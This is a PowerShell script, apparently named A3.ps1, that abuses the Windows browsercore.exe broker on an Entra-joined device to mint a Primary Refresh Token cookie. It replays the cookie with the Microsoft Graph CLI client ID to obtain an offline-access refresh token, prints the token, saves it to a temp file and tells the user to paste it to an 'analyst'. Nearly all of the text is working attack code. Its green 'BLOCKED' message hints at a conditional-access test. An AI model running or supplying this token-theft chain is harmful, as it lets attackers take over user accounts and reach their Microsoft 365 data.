

$tenant="aba1146c-dd62-4078-a5b7-a4e0668141eb"
$client="14d82eec-204b-4c2f-b7e8-296a70dab67e"   # Microsoft Graph CLI (public client)
$scope="https://graph.microsoft.com/.default offline_access openid"

$nonce=(Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/token" -Body "grant_type=srv_challenge").Nonce
$bc="$env:WINDIR\BrowserCore\browsercore.exe"; if(-not(Test-Path $bc)){$bc="$env:WINDIR\System32\browsercore.exe"}
if(-not(Test-Path $bc)){Write-Host "[!] browsercore.exe not found - is this an Entra-joined device?" -ForegroundColor Red; return}
$reqObj=@{method="GetCookies";sender="https://login.microsoftonline.com";uri="https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce"}|ConvertTo-Json -Compress
$psi=New-Object Diagnostics.ProcessStartInfo; $psi.FileName=$bc; $psi.RedirectStandardInput=$true; $psi.RedirectStandardOutput=$true; $psi.UseShellExecute=$false
$p=[Diagnostics.Process]::Start($psi); $m=[Text.Encoding]::UTF8.GetBytes($reqObj)
$p.StandardInput.BaseStream.Write([BitConverter]::GetBytes($m.Length),0,4); $p.StandardInput.BaseStream.Write($m,0,$m.Length); $p.StandardInput.BaseStream.Flush(); $p.StandardInput.Close()
$so=$p.StandardOutput.BaseStream; $lb=New-Object byte[] 4; $null=$so.Read($lb,0,4); $len=[BitConverter]::ToInt32($lb,0); $buf=New-Object byte[] $len; $rd=0; while($rd -lt $len){$rd+=$so.Read($buf,$rd,$len-$rd)}
$prt=((([Text.Encoding]::UTF8.GetString($buf))|ConvertFrom-Json).response|?{$_.name -eq 'x-ms-RefreshTokenCredential'}).data
if(-not $prt){Write-Host "[!] no PRT cookie minted" -ForegroundColor Red; return}
Write-Host "[+] PRT cookie minted" -ForegroundColor Green

Add-Type -AssemblyName System.Net.Http
$ver=-join((1..64)|%{[char]((48..57)+(65..90)+(97..122)|Get-Random)}); $sha=[Security.Cryptography.SHA256]::Create()
$ch=[Convert]::ToBase64String($sha.ComputeHash([Text.Encoding]::ASCII.GetBytes($ver))).TrimEnd('=').Replace('+','-').Replace('/','_')
$h=New-Object System.Net.Http.HttpClientHandler; $h.AllowAutoRedirect=$false; $h.CookieContainer=New-Object System.Net.CookieContainer
$h.CookieContainer.Add((New-Object Uri("https://login.microsoftonline.com")),(New-Object System.Net.Cookie("x-ms-RefreshTokenCredential",$prt,"/","login.microsoftonline.com")))
$hc=New-Object System.Net.Http.HttpClient($h)
$url="https://login.microsoftonline.com/$tenant/oauth2/v2.0/authorize?client_id=$client&response_type=code&redirect_uri=http%3A%2F%2Flocalhost&scope=$([uri]::EscapeDataString($scope))&code_challenge=$ch&code_challenge_method=S256&state=r"
$code=$null
for($i=0;$i -lt 12;$i++){
  $rs=$hc.GetAsync($url).Result; $s=[int]$rs.StatusCode
  if($s -ge 300 -and $s -lt 400 -and $rs.Headers.Location){
    $loc=$rs.Headers.Location.ToString()
    if($loc -match 'localhost.*[?&]code=([^&]+)'){$code=[uri]::UnescapeDataString($matches[1]);break}
    if($loc -notmatch '^https?://'){$loc="https://login.microsoftonline.com$loc"}; $url=$loc; continue
  }
  $b=$rs.Content.ReadAsStringAsync().Result; if($b -match 'AADSTS(\d+)'){Write-Host "[---] BLOCKED AADSTS$($matches[1])" -ForegroundColor Green}; break
}

if($code){
  $tb="client_id=$client&grant_type=authorization_code&code=$([uri]::EscapeDataString($code))&redirect_uri=http%3A%2F%2Flocalhost&code_verifier=$ver&scope=$([uri]::EscapeDataString($scope))"
  $tok=Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$tenant/oauth2/v2.0/token" -Body $tb -ContentType "application/x-www-form-urlencoded"
  Set-Content "$env:TEMP\rt.txt" $tok.refresh_token
  Write-Host "`n===== A3 REFRESH TOKEN (copy this WHOLE line and paste to analyst) =====`n" -ForegroundColor Yellow
  Write-Host $tok.refresh_token -ForegroundColor Yellow
  Write-Host "`n===== (also saved to $env:TEMP\rt.txt) =====" -ForegroundColor Yellow
} else {
  Write-Host "[?] no auth code (cookie/nonce issue) - just re-run A3.ps1" -ForegroundColor Yellow
}
